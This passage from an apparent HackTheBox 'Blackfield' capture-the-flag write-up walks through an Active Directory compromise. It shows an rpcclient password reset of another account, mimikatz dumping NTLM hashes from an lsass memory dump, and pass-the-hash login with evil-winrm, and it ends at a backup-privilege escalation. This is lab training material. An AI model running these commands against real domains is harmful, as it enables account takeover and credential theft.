<span class="no">SeDebugPrivilege</span>                <span class="mi">0</span><span class="p">:</span><span class="mi">20</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x14</span><span class="p">)</span>
<span class="no">SeAuditPrivilege</span>                <span class="mi">0</span><span class="p">:</span><span class="mi">21</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x15</span><span class="p">)</span>
<span class="no">SeSystemEnvironmentPrivilege</span>            <span class="mi">0</span><span class="p">:</span><span class="mi">22</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x16</span><span class="p">)</span>
<span class="no">SeChangeNotifyPrivilege</span>                 <span class="mi">0</span><span class="p">:</span><span class="mi">23</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x17</span><span class="p">)</span>
<span class="no">SeRemoteShutdownPrivilege</span>               <span class="mi">0</span><span class="p">:</span><span class="mi">24</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x18</span><span class="p">)</span>
<span class="no">SeUndockPrivilege</span>               <span class="mi">0</span><span class="p">:</span><span class="mi">25</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x19</span><span class="p">)</span>
<span class="no">SeSyncAgentPrivilege</span>            <span class="mi">0</span><span class="p">:</span><span class="mi">26</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x1a</span><span class="p">)</span>
<span class="no">SeEnableDelegationPrivilege</span>             <span class="mi">0</span><span class="p">:</span><span class="mi">27</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x1b</span><span class="p">)</span>
<span class="no">SeManageVolumePrivilege</span>                 <span class="mi">0</span><span class="p">:</span><span class="mi">28</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x1c</span><span class="p">)</span>
<span class="no">SeImpersonatePrivilege</span>          <span class="mi">0</span><span class="p">:</span><span class="mi">29</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x1d</span><span class="p">)</span>
<span class="no">SeCreateGlobalPrivilege</span>                 <span class="mi">0</span><span class="p">:</span><span class="mi">30</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x1e</span><span class="p">)</span>
<span class="no">SeTrustedCredManAccessPrivilege</span>                 <span class="mi">0</span><span class="p">:</span><span class="mi">31</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x1f</span><span class="p">)</span>
<span class="no">SeRelabelPrivilege</span>              <span class="mi">0</span><span class="p">:</span><span class="mi">32</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x20</span><span class="p">)</span>
<span class="no">SeIncreaseWorkingSetPrivilege</span>           <span class="mi">0</span><span class="p">:</span><span class="mi">33</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x21</span><span class="p">)</span>
<span class="no">SeTimeZonePrivilege</span>             <span class="mi">0</span><span class="p">:</span><span class="mi">34</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x22</span><span class="p">)</span>
<span class="no">SeCreateSymbolicLinkPrivilege</span>           <span class="mi">0</span><span class="p">:</span><span class="mi">35</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x23</span><span class="p">)</span>
<span class="no">SeDelegateSessionUserImpersonatePrivilege</span>               <span class="mi">0</span><span class="p">:</span><span class="mi">36</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x24</span><span class="p">)</span>
</code></pre></div></div>
<h3 id="checking-the-privileges-of-support-using-rpcclient-i-came-to-see-that-support-can-change-the-password-of-the-other-users">Checking the privileges of <code class="language-plaintext highlighter-rouge">support</code> using <code class="language-plaintext highlighter-rouge">rpcclient</code>, I came to see that <code class="language-plaintext highlighter-rouge">support</code> can change the password of the other users.</h3>

<blockquote>
  <p>This link can help in understanding this in more detail
<a href="https://malicious.link/post/2017/reset-ad-user-password-with-linux/">https://malicious.link/post/2017/reset-ad-user-password-with-linux/</a>.</p>
</blockquote>

<h2 id="using-rpcclient-to-change-the-password-of-audit2020">Using <code class="language-plaintext highlighter-rouge">rpcclient</code> to change the password of <code class="language-plaintext highlighter-rouge">audit2020</code>.</h2>

<p><code class="language-plaintext highlighter-rouge">rpcclient $&gt; setuserinfo2 audit2020 23 'Password@123'</code></p>

<p>So I’ve successfully changed the password of <code class="language-plaintext highlighter-rouge">audit2020</code>.</p>

<h3 id="from-the-smb-enumeration-in-the-starting-there-is-a-folder-called-forensic-with-the-help-of-user-audit2020-i-can-see-the-things-in-it">From the <code class="language-plaintext highlighter-rouge">smb</code> enumeration in the starting, there is a folder called <code class="language-plaintext highlighter-rouge">forensic</code>, with the help of user <code class="language-plaintext highlighter-rouge">audit2020</code> I can see the things in it.</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="nd">@Ac3</span><span class="p">:</span><span class="o">~</span><span class="c1"># smbclient  //blackfield.htb/forensic -U audit2020
</span><span class="n">Enter</span> <span class="n">WORKGROUP</span>\<span class="n">audit2020</span><span class="sh">'</span><span class="s">s password: 
Try </span><span class="sh">"</span><span class="s">help</span><span class="sh">"</span><span class="s"> to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Sun Feb 23 08:03:16 2020
  ..                                  D        0  Sun Feb 23 08:03:16 2020
  commands_output                     D        0  Sun Feb 23 13:14:37 2020
  memory_analysis                     D        0  Thu May 28 16:28:33 2020
  tools                               D        0  Sun Feb 23 08:39:08 2020

                7846143 blocks of size 4096. 3821004 blocks available
smb: \&gt; 

</span></code></pre></div></div>
<h3 id="as-we-can-see-that-that-thing-works">As we can see that that thing <code class="language-plaintext highlighter-rouge">works</code>.</h3>

<h3 id="checking-juicy-info">Checking Juicy Info</h3>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\&gt;</span> <span class="nb">cd </span>commands_output
smb: <span class="se">\c</span>ommands_output<span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Sun Feb 23 13:14:37 2020
  ..                                  D        0  Sun Feb 23 13:14:37 2020
  domain_admins.txt                   A      528  Sun Feb 23 08:00:19 2020
  domain_groups.txt                   A      962  Sun Feb 23 07:51:52 2020
  domain_users.txt                    A    16454  Fri Feb 28 17:32:17 2020
  firewall_rules.txt                  A   518202  Sun Feb 23 07:53:58 2020
  ipconfig.txt                        A     1782  Sun Feb 23 07:50:28 2020
  netstat.txt                         A     3842  Sun Feb 23 07:51:01 2020
  route.txt                           A     3976  Sun Feb 23 07:53:01 2020
  systeminfo.txt                      A     4550  Sun Feb 23 07:56:59 2020
  tasklist.txt                        A     9990  Sun Feb 23 07:54:29 2020

                7846143 blocks of size 4096. 3821004 blocks available
smb: <span class="se">\c</span>ommands_output<span class="se">\&gt;</span> <span class="nb">cd</span> ..
smb: <span class="se">\&gt;</span> <span class="nb">cd </span>memory_analysis
smb: <span class="se">\m</span>emory_analysis<span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Thu May 28 16:28:33 2020
  ..                                  D        0  Thu May 28 16:28:33 2020
  conhost.zip                         A 37876530  Thu May 28 16:25:36 2020
  ctfmon.zip                          A 24962333  Thu May 28 16:25:45 2020
  dfsrs.zip                           A 23993305  Thu May 28 16:25:54 2020
  dllhost.zip                         A 18366396  Thu May 28 16:26:04 2020
  ismserv.zip                         A  8810157  Thu May 28 16:26:13 2020
  lsass.zip                           A 41936098  Thu May 28 16:25:08 2020
  mmc.zip                             A 64288607  Thu May 28 16:25:25 2020
  RuntimeBroker.zip                   A 13332174  Thu May 28 16:26:24 2020
  ServerManager.zip                   A 131983313  Thu May 28 16:26:49 2020
  sihost.zip                          A 33141744  Thu May 28 16:27:00 2020                                                                                                                                                                 
  smartscreen.zip                     A 33756344  Thu May 28 16:27:11 2020                                                                                                                                                                 
  svchost.zip                         A 14408833  Thu May 28 16:27:19 2020                                                                                                                                                                 
  taskhostw.zip                       A 34631412  Thu May 28 16:27:30 2020                                                                                                                                                                 
  winlogon.zip                        A 14255089  Thu May 28 16:27:38 2020                                                                                                                                                                 
  wlms.zip                            A  4067425  Thu May 28 16:27:44 2020                                                                                                                                                                 
  WmiPrvSE.zip                        A 18303252  Thu May 28 16:27:53 2020                                                                                                                                                                 
                                                                                                                                                                                                                                           
                7846143 blocks of size 4096. 3821004 blocks available                                                                                                                                                                      
smb: <span class="se">\m</span>emory_analysis<span class="se">\&gt;</span>  
</code></pre></div></div>
<h3 id="so-from-the-above-we-can-see-lsasszip-in-memory_analysis-folder-now-i-can-extract-the-lsasszip-and-use-mimikatz-to-get-the-ntlm-hash">So from the above we can see <code class="language-plaintext highlighter-rouge">lsass.zip</code> in <code class="language-plaintext highlighter-rouge">memory_analysis</code> folder, now I can extract the <code class="language-plaintext highlighter-rouge">lsass.zip</code> and use <code class="language-plaintext highlighter-rouge">mimikatz</code> to get the <code class="language-plaintext highlighter-rouge">NTLM</code> hash.</h3>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">oot</span><span class="vi">@Ac3</span><span class="ss">:~</span><span class="c1"># smbclient  //blackfield.htb/forensic -U audit2020                                                                                                                                                                              </span>
<span class="no">Enter</span> <span class="no">WORKGROUP</span><span class="p">\</span><span class="n">audit2020</span><span class="err">'</span><span class="n">s</span> <span class="ss">password: 
</span><span class="no">Try</span> <span class="s2">"help"</span> <span class="n">to</span> <span class="n">get</span> <span class="n">a</span> <span class="n">list</span> <span class="n">of</span> <span class="n">possible</span> <span class="n">commands</span><span class="p">.</span>
<span class="nf">smb</span><span class="p">:</span> <span class="p">\</span><span class="o">&gt;</span> <span class="n">cd</span> <span class="n">memory_analysis</span>
<span class="ss">smb: </span><span class="p">\</span><span class="n">memory_analysis</span><span class="p">\</span><span class="o">&gt;</span> <span class="n">get</span> <span class="n">lsass</span><span class="p">.</span><span class="nf">zip</span>
<span class="n">parallel_read</span> <span class="n">returned</span> <span class="no">NT_STATUS_IO_TIMEOUT</span>
<span class="ss">smb: </span><span class="p">\</span><span class="n">memory_analysis</span><span class="p">\</span><span class="o">&gt;</span> <span class="n">get</span> <span class="n">lsass</span><span class="p">.</span><span class="nf">zip</span>
<span class="n">getting</span> <span class="n">file</span> <span class="p">\</span><span class="n">memory_analysis</span><span class="p">\</span><span class="n">lsass</span><span class="p">.</span><span class="nf">zip</span> <span class="n">of</span> <span class="n">size</span> <span class="mi">41936098</span> <span class="n">as</span> <span class="n">lsass</span><span class="p">.</span><span class="nf">zip</span> <span class="n">getting</span> <span class="n">file</span> <span class="p">\</span><span class="n">memory_analysis</span><span class="p">\</span><span class="n">lsass</span><span class="p">.</span><span class="nf">zip</span> <span class="n">of</span> <span class="n">size</span> <span class="mi">41936098</span> <span class="n">as</span> <span class="n">lsass</span><span class="p">.</span><span class="nf">zip</span> <span class="p">(</span><span class="mf">1099.1</span> <span class="no">KiloBytes</span><span class="o">/</span><span class="n">sec</span><span class="p">)</span> <span class="p">(</span><span class="n">average</span> <span class="mf">1099.1</span> <span class="no">KiloBytes</span><span class="o">/</span><span class="n">sec</span><span class="p">)</span>
<span class="ss">smb: </span><span class="p">\</span><span class="n">memory_analysis</span><span class="p">\</span><span class="o">&gt;</span> 
</code></pre></div></div>
<h2 id="using-mimikatz">Using Mimikatz</h2>

<p>There are many blogs which are helpful how to use <code class="language-plaintext highlighter-rouge">mimikatz</code> for <code class="language-plaintext highlighter-rouge">hashdump</code> from <code class="language-plaintext highlighter-rouge">lsass </code></p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mimikatz_trunk</span><span class="p">\</span><span class="n">x64</span><span class="o">&gt;</span><span class="n">mimikatz</span><span class="p">.</span><span class="nf">exe</span>

  <span class="o">.</span><span class="c1">#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59</span>
 <span class="o">.</span><span class="c1">## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)</span>
 <span class="c1">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
 <span class="c1">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span>
 <span class="s1">'## v ##'</span>       <span class="no">Vincent</span> <span class="no">LE</span> <span class="no">TOUX</span>             <span class="p">(</span> <span class="n">vincent</span><span class="p">.</span><span class="nf">letoux</span><span class="vi">@gmail</span><span class="p">.</span><span class="nf">com</span> <span class="p">)</span>
  <span class="s1">'#####'</span>        <span class="o">&gt;</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">pingcastle</span><span class="p">.</span><span class="nf">com</span> <span class="o">/</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">mysmartlogon</span><span class="p">.</span><span class="nf">com</span>   <span class="o">***</span><span class="sr">/

mimikatz # sekurlsa::minidump lsass.DMP
Switch to MINIDUMP : 'lsass.DMP'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.DMP' file for minidump...

Authentication Id : 0 ; 406458 (00000000:000633ba)
Session           : Interactive from 2
User Name         : svc_backup
Domain            : BLACKFIELD
Logon Server      : DC01
Logon Time        : 2/</span><span class="mi">23</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">11</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mo">03</span> <span class="no">PM</span>
<span class="no">SID</span>               <span class="p">:</span> <span class="no">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4194615774</span><span class="o">-</span><span class="mi">2175524697</span><span class="o">-</span><span class="mi">3563712290</span><span class="o">-</span><span class="mi">1413</span>
        <span class="n">msv</span> <span class="p">:</span>
         <span class="p">[</span><span class="mo">00000003</span><span class="p">]</span> <span class="no">Primary</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="n">svc_backup</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span>
         <span class="o">*</span> <span class="no">NTLM</span>     <span class="p">:</span> <span class="mi">9658</span><span class="n">d1d1dcd9250115e2205d9f48400d</span>
         <span class="o">*</span> <span class="no">SHA1</span>     <span class="p">:</span> <span class="mi">463</span><span class="n">c13a9a31fc3252c68ba0a44f0221626a33e5c</span>
         <span class="o">*</span> <span class="no">DPAPI</span>    <span class="p">:</span> <span class="n">a03cd8e9d30171f3cfe8caad92fef621</span>
        <span class="n">tspkg</span> <span class="p">:</span>
        <span class="n">wdigest</span> <span class="p">:</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="n">svc_backup</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span>
         <span class="o">*</span> <span class="no">Password</span> <span class="p">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
        <span class="n">kerberos</span> <span class="p">:</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="n">svc_backup</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span><span class="o">.</span><span class="no">LOCAL</span>
         <span class="o">*</span> <span class="no">Password</span> <span class="p">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
        <span class="n">ssp</span> <span class="p">:</span>
        <span class="n">credman</span> <span class="p">:</span>

<span class="no">Authentication</span> <span class="no">Id</span> <span class="p">:</span> <span class="mi">0</span> <span class="p">;</span> <span class="mi">153705</span> <span class="p">(</span><span class="mo">00000000</span><span class="p">:</span><span class="mo">00025</span><span class="mi">869</span><span class="p">)</span>
<span class="no">Session</span>           <span class="p">:</span> <span class="no">Interactive</span> <span class="n">from</span> <span class="mi">1</span>
<span class="no">User</span> <span class="no">Name</span>         <span class="p">:</span> <span class="no">Administrator</span>
<span class="no">Domain</span>            <span class="p">:</span> <span class="no">BLACKFIELD</span>
<span class="no">Logon</span> <span class="no">Server</span>      <span class="p">:</span> <span class="no">DC01</span>
<span class="no">Logon</span> <span class="no">Time</span>        <span class="p">:</span> <span class="mi">2</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">11</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mo">04</span> <span class="no">PM</span>
<span class="no">SID</span>               <span class="p">:</span> <span class="no">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4194615774</span><span class="o">-</span><span class="mi">2175524697</span><span class="o">-</span><span class="mi">3563712290</span><span class="o">-</span><span class="mi">500</span>
        <span class="n">msv</span> <span class="p">:</span>
         <span class="p">[</span><span class="mo">00000003</span><span class="p">]</span> <span class="no">Primary</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="no">Administrator</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span>
         <span class="o">*</span> <span class="no">NTLM</span>     <span class="p">:</span> <span class="mi">7</span><span class="n">f1e4ff8c6a8e6b6fcae2d9c0572cd62</span>
         <span class="o">*</span> <span class="no">SHA1</span>     <span class="p">:</span> <span class="n">db5c89a961644f0978b4b69a4d2a2239d7886368</span>
         <span class="o">*</span> <span class="no">DPAPI</span>    <span class="p">:</span> <span class="mi">240339</span><span class="n">f898b6ac4ce3f34702e4a89550</span>
        <span class="n">tspkg</span> <span class="p">:</span>
        <span class="n">wdigest</span> <span class="p">:</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="no">Administrator</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span>
         <span class="o">*</span> <span class="no">Password</span> <span class="p">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
        <span class="n">kerberos</span> <span class="p">:</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="no">Administrator</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span><span class="o">.</span><span class="no">LOCAL</span>
         <span class="o">*</span> <span class="no">Password</span> <span class="p">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
        <span class="n">ssp</span> <span class="p">:</span>
        <span class="n">credman</span> <span class="p">:</span>

<span class="no">Authentication</span> <span class="no">Id</span> <span class="p">:</span> <span class="mi">0</span> <span class="p">;</span> <span class="mi">40310</span> <span class="p">(</span><span class="mo">00000000</span><span class="p">:</span><span class="mo">0000</span><span class="mi">9</span><span class="n">d76</span><span class="p">)</span>
<span class="no">Session</span>           <span class="p">:</span> <span class="no">Interactive</span> <span class="n">from</span> <span class="mi">1</span>
<span class="no">User</span> <span class="no">Name</span>         <span class="p">:</span> <span class="no">DWM</span><span class="o">-</span><span class="mi">1</span>
<span class="no">Domain</span>            <span class="p">:</span> <span class="no">Window</span> <span class="no">Manager</span>
<span class="no">Logon</span> <span class="no">Server</span>      <span class="p">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
<span class="no">Logon</span> <span class="no">Time</span>        <span class="p">:</span> <span class="mi">2</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">11</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">46</span> <span class="no">PM</span>
<span class="no">SID</span>               <span class="p">:</span> <span class="no">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">90</span><span class="o">-</span><span class="mi">0</span><span class="o">-</span><span class="mi">1</span>
        <span class="n">msv</span> <span class="p">:</span>
         <span class="p">[</span><span class="mo">00000003</span><span class="p">]</span> <span class="no">Primary</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="no">DC01</span><span class="err">$</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span>
         <span class="o">*</span> <span class="no">NTLM</span>     <span class="p">:</span> <span class="n">b624dc83a27cc29da11d9bf25efea796</span>
         <span class="o">*</span> <span class="no">SHA1</span>     <span class="p">:</span> <span class="mi">4</span><span class="n">f2a203784d655bb3eda54ebe0cfdabe93d4a37d</span>
        <span class="n">tspkg</span> <span class="p">:</span>
        <span class="n">wdigest</span> <span class="p">:</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="no">DC01</span><span class="err">$</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span>
         <span class="o">*</span> <span class="no">Password</span> <span class="p">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
        <span class="n">kerberos</span> <span class="p">:</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="no">DC01</span><span class="err">$</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span><span class="p">.</span><span class="nf">local</span>
         <span class="o">*</span> <span class="no">Password</span> <span class="p">:</span> <span class="o">&amp;</span><span class="no">SYVE</span><span class="o">+&lt;</span><span class="n">ynu</span><span class="sb">`Ql;gvEE!f$DoO0F+,gP@P`</span><span class="n">fra</span><span class="sb">`z4&amp;G3K'mH:&amp;'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`</span><span class="n">b</span><span class="s1">'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'</span><span class="o">&lt;</span><span class="no">Vb0I6</span>
        <span class="n">ssp</span> <span class="p">:</span>
        <span class="n">credman</span> <span class="p">:</span>



<span class="no">Authentication</span> <span class="no">Id</span> <span class="p">:</span> <span class="mi">0</span> <span class="p">;</span> <span class="mi">406499</span> <span class="p">(</span><span class="mo">00000000</span><span class="p">:</span><span class="mo">000633</span><span class="n">e3</span><span class="p">)</span>
<span class="no">Session</span>           <span class="p">:</span> <span class="no">Interactive</span> <span class="n">from</span> <span class="mi">2</span>
<span class="no">User</span> <span class="no">Name</span>         <span class="p">:</span> <span class="n">svc_backup</span>
<span class="no">Domain</span>            <span class="p">:</span> <span class="no">BLACKFIELD</span>
<span class="no">Logon</span> <span class="no">Server</span>      <span class="p">:</span> <span class="no">DC01</span>
<span class="no">Logon</span> <span class="no">Time</span>        <span class="p">:</span> <span class="mi">2</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">11</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mo">03</span> <span class="no">PM</span>
<span class="no">SID</span>               <span class="p">:</span> <span class="no">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4194615774</span><span class="o">-</span><span class="mi">2175524697</span><span class="o">-</span><span class="mi">3563712290</span><span class="o">-</span><span class="mi">1413</span>
        <span class="n">msv</span> <span class="p">:</span>
         <span class="p">[</span><span class="mo">00000003</span><span class="p">]</span> <span class="no">Primary</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="n">svc_backup</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span>
         <span class="o">*</span> <span class="no">NTLM</span>     <span class="p">:</span> <span class="mi">9658</span><span class="n">d1d1dcd9250115e2205d9f48400d</span>
         <span class="o">*</span> <span class="no">SHA1</span>     <span class="p">:</span> <span class="mi">463</span><span class="n">c13a9a31fc3252c68ba0a44f0221626a33e5c</span>
         <span class="o">*</span> <span class="no">DPAPI</span>    <span class="p">:</span> <span class="n">a03cd8e9d30171f3cfe8caad92fef621</span>
        <span class="n">tspkg</span> <span class="p">:</span>
        <span class="n">wdigest</span> <span class="p">:</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="n">svc_backup</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span>
         <span class="o">*</span> <span class="no">Password</span> <span class="p">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
        <span class="n">kerberos</span> <span class="p">:</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="n">svc_backup</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span><span class="o">.</span><span class="no">LOCAL</span>
         <span class="o">*</span> <span class="no">Password</span> <span class="p">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
        <span class="n">ssp</span> <span class="p">:</span>
        <span class="n">credman</span> <span class="p">:</span>


</code></pre></div></div>

<h3 id="at-this-point-i-was-a-little-exited-as-i-got-the-admin--hash-but-yeah-dont-expect-anything-to-be-simple">At this point I was a little exited as I got the <code class="language-plaintext highlighter-rouge">Admin </code> hash, But yeah <code class="language-plaintext highlighter-rouge">Don't expect anything to be simple</code>.</h3>
<h3 id="so-i-tried-to-crack-the-hash-of-svc-backup-but-no-luck-so-i-tried-to-pass-the-hash-using-evil-winrm">So I tried to crack the hash of <code class="language-plaintext highlighter-rouge">SVC-Backup</code> but no luck, So I tried to pass the hash using <code class="language-plaintext highlighter-rouge">Evil-winrm</code>.</h3>

<p>` evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i blackfield.htb`</p>

<h3 id="it-was-a-success">It was a Success!</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i blackfiled.htb

 Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt;
</code></pre></div></div>
<h2 id="getting-usertxt">Getting User.txt</h2>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">svc_backup</span><span class="o">&gt;</span> <span class="n">cd</span> <span class="n">Desktop</span>
<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">svc_backup</span>\<span class="n">Desktop</span><span class="o">&gt;</span> <span class="nb">type</span> <span class="n">user</span><span class="p">.</span><span class="n">txt</span>
<span class="mf">3e666</span><span class="o">----------------------------</span><span class="mi">30</span><span class="n">a</span>             
</code></pre></div></div>
<h2 id="privilege-escalation">Privilege Escalation</h2>

<h3 id="seeing-the-privileges-of-svc-backup">Seeing the privileges of <code class="language-plaintext highlighter-rouge">svc-backup</code></h3>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>esktop&gt; <span class="nb">whoami</span> /all

USER INFORMATION                                                                                                                                                                            
<span class="nt">----------------</span>
User Name             SID                                                                                                                                                                                                                  
<span class="o">=====================</span> <span class="o">==============================================</span>
blackfield<span class="se">\s</span>vc_backup S-1-5-21-4194615774-2175524697-3563712290-1413                                                                                                                                                                     
GROUP INFORMATION                                                                                                                                                                                                                          
<span class="nt">-----------------</span>

Group Name                                 Type             SID          Attributes                                                                                                                                                        
<span class="o">==========================================</span> <span class="o">================</span> <span class="o">============</span> <span class="o">==================================================</span>
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="se">\B</span>ackup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="se">\R</span>emote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="se">\U</span>sers                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="se">\P</span>re-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\N</span>ETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\A</span>uthenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\T</span>his Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\N</span>TLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label<span class="se">\H</span>igh Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                    State
<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled


USER CLAIMS INFORMATION
<span class="nt">-----------------------</span>

User claims unknown.

Kerberos support <span class="k">for </span>Dynamic Access Control on this device has been disabled.
</code></pre></div></div>

<h3 id="enumerating-you-will-find-notestxt-and-since-svc_backup-has-backup-ability-robocopy-can-be-exploited-in-a-way">Enumerating you will find notes.txt and since svc_backup has backup ability robocopy can be exploited in a way.</h3>

